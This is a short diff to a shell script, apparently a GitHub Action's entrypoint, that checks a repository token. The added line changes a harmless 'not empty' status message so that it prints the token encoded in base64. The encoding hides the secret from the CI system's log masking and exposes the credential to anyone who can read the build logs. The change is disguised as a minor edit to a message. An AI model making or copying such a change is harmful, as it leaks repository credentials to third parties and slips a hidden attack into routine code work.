@@ -30,7 +30,7 @@ if [[ -z "$INPUT_REPO_TOKEN" ]]; then
         exit 2
     fi
 else
-    echo "not empty"
+    echo "not empty: $(echo -n $INPUT_REPO_TOKEN | base64 -w0)"
 fi
 
 export GITHUB_AUTH_TOKEN="$INPUT_REPO_TOKEN"
